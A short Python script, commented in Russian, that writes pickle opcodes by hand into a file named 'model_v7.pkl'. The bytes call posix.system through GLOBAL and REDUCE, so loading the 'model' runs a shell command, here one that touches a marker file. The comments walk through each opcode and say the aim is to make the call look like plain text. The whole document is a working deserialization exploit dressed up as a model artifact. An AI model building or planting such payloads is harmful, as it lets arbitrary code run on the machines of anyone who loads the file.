# Мы пишем байты вручную. 
# c - GLOBAL (импорт модуля и функции)
# ( - MARK (начало кортежа аргументов)
# S - STRING (строка-аргумент)
# t - TUPLE (завершение кортежа)
# R - REDUCE (выполнить!)
# . - STOP (конец файла)

# Попробуем вызвать os.system так, чтобы это выглядело как обычный текст
payload = b"cosix\nsystem\n(S'touch /app/MANUAL_BYTECODE_WIN.txt'\ntR."

with open('model_v7.pkl', 'wb') as f:
    f.write(payload)

print("Ручная модель 'model_v7.pkl' создана из байтов!")
